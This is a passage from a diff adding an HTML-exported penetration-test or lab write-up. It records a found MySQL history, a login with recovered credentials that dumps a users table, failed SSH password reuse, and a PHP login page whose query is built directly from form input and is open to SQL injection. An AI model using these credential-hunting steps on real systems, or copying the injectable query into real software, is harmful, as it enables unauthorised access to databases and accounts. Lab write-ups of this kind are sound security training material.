+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">create user 'john'@'localhost' identified by 'hiroshima';</font>
+        </div>
+        <div>version;</div>
+        <div>-v</div>
+        <div>;</div>
+        <div>help</div>
+        <div>flush privileges;</div>
+        <div>show databases;</div>
+        <div>use mysql;</div>
+        <div>grant select,insert,update,delete on *.* to 'john'@'localhost';</div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">update user set password = password('hiroshima') where user = 'john';</font>
+        </div>
+        <div>flush priveleges;</div>
+        <div>use webapp;</div>
+        <div>show tables;</div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">update user set password = password('Ha56!blaKAbl') where user = 'admin';</font>
+        </div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">update username set password = password('Ha56!blaKAbl') where user = 'admin';</font>
+        </div>
+        <div>select * from users;</div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">update username set password = password('Ha56!blaKAbl') where username = 'admin';</font>
+        </div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">update users set password = password('Ha56!blaKAbl') where username = 'admin';</font>
+        </div>
+        <div>select * from users;</div>
+        <div>
+            <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">insert into users values(2,'john','66lajGGbla');</font>
+        </div>
+        <div>select * from users;</div>
+    </div>
+    <div><br /></div>
+    <div>Connecting to the mysql service with user john and password hiroshima, we were able to dump the webapp users table.</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>bash-3.00# mysql -u john -p</div>
+        <div>Enter password: hiroshima</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>Welcome to the MySQL monitor.  Commands end with ; or \g.</div>
+        <div>Your MySQL connection id is 398 to server version: 4.1.22</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>Type 'help;' or '\h' for help. Type '\c' to clear the buffer.</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>mysql&gt; show databases;</div>
+        <div>show databases;</div>
+        <div>+----------+</div>
+        <div>| Database |</div>
+        <div>+----------+</div>
+        <div>| mysql    |</div>
+        <div>| test     |</div>
+        <div>| webapp   |</div>
+        <div>+----------+</div>
+        <div>3 rows in set (0.03 sec)</div>
+        <div><br /></div>
+        <div>mysql&gt; use webapp;</div>
+        <div>use webapp;</div>
+        <div>Reading table information for completion of table and column names</div>
+        <div>You can turn off this feature to get a quicker startup with -A</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>Database changed</div>
+        <div>mysql&gt; show tables;</div>
+        <div>show tables;</div>
+        <div>+------------------+</div>
+        <div>| Tables_in_webapp |</div>
+        <div>+------------------+</div>
+        <div>| users            |</div>
+        <div>+------------------+</div>
+        <div>1 row in set (0.00 sec)</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>mysql&gt; select * from users;</div>
+        <div>select * from users;</div>
+        <div>+------+----------+------------+</div>
+        <div>| id   | username | password   |</div>
+        <div>+------+----------+------------+</div>
+        <div>|    1 | admin    | <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">5afac8d85f</font> |</div>
+        <div>|    2 | john     | <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">66lajGGbla</font> |</div>
+        <div>+------+----------+------------+</div>
+        <div>2 rows in set (0.00 sec)</div>
+    </div>
+    <div><br /></div>
+    <div>I tried all these passwords on the SSH service (for root, john and harold), but none worked.</div>
+    <div><br /></div>
+    <div><br /></div>
+    <div><span style="font-weight: bold;">index.php</span></div>
+    <div><br /></div>
+    <div>Looking for database credentials in the PHP page we were able to do the SQL injection attack on...</div>
+    <div><br /></div>
+    <div class="evernote-code-box" style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;">
+        <div>bash-3.00# cat index.php</div>
+        <div>&lt;?php</div>
+        <div>        <font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());</font>
+        </div>
+        <div>        //print "Connected to MySQL&lt;br /&gt;";</div>
+        <div>        mysql_select_db("webapp");</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>        if ($_POST['uname'] != ""){</div>
+        <div>                $username = $_POST['uname'];</div>
+        <div>                $password = $_POST['psw'];</div>
+        <div>                $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";</div>
+        <div>
+            <div>                //print $query."</div>
+            <div>";</div>
+        </div>
+        <div>                $result = mysql_query($query);</div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>                $row = mysql_fetch_array($result);</div>
+        <div>                //print "ID: ".$row['id']."&lt;br /&gt;";</div>
+        <div>        }  </div>
+        <div>
+            <div><br /></div>
+        </div>
+        <div>?&gt;</div>
+        <div>[...snip...]</div>
+    </div>
+    <div><br /></div>
+    <div>Nothing new here, but documented for posterity.</div>
+    <div><br /></div>
+    <div><br /></div>
